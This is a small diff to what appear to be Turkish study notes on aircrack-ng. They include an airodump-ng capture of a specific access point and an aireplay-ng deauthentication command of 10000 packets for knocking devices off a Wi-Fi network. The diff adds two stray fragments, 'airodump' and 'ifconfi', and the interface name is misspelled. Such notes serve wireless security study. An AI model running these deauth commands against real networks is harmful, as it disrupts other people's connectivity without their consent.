@@ -4,6 +4,7 @@
 ~airodump-ng wlan0mon //ağların bilgileri
 
 ~airodump-ng --channel 9 --bssid E4:C3:2A:B7:23:90 --write airodumptest wlan0mon //channel ve mac adresi bilinmeli
+airodump
 
 ## Ağdan Atma
 
@@ -14,3 +15,4 @@
 --Belirli Cihazları Ağdan Atma--
 
 ~aireplay-ng --deauth 10000 -a E4:C3:2A:B7:23:90 -c {atmak istediğimiz ağın mac adresi} wlam0mon
+ifconfi
